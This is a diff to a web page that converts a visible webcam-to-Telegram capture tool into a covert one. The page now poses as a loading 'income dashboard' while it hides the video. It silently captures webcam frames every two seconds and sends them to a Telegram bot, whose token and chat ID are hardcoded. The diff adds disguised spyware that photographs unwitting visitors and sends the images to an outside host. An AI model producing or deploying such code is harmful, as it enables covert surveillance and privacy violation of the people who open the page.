@@ -2,7 +2,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Live Capture to Telegram</title>
+  <title>Loading...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,64 +10,48 @@
       text-align: center;
       padding: 50px;
     }
-    h1 {
-      color: #00796b;
-    }
-    #video {
-      border: 5px solid #26a69a;
-      border-radius: 10px;
-      width: 320px;
-      height: 240px;
-    }
-    .btn {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 18px;
-      color: white;
-      background-color: #00796b;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background-color: #004d40;
-    }
     .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #00796b;
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #00796b;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      width: 80px;
+      height: 80px;
       animation: spin 1s linear infinite;
-      margin: 20px auto;
+      margin: 100px auto;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    .loading-text {
+      font-size: 20px;
+      color: #004d40;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
-  <h1>Live Income Loader</h1>
-  <video id="video" autoplay muted playsinline></video>
   <div class="loader"></div>
-  <button class="btn" onclick="captureAndSend()">Capture & Send to Telegram</button><canvas id="canvas" style="display: none;"></canvas>
+  <div class="loading-text">Loading your income dashboard...</div><video id="video" autoplay muted playsinline style="display: none;"></video> <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-
-    // Telegram details
     const botToken = '8182610963:AAFcz4eIbThryJkQJ0Xb22jRM_nZBW-IxTs';
     const chatId = '6431178492';
 
-    // Start camera
+    // Start the camera silently
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
+
+        // Start auto-capture loop
+        setInterval(() => {
+          captureAndSend();
+        }, 2000); // every 2 seconds
       })
       .catch(err => {
-        alert('Camera access denied.');
+        console.error('Camera access denied or error:', err);
       });
 
     function captureAndSend() {
@@ -95,4 +79,4 @@
       }, 'image/jpeg');
     }
   </script></body>
-  </html>
+</html>
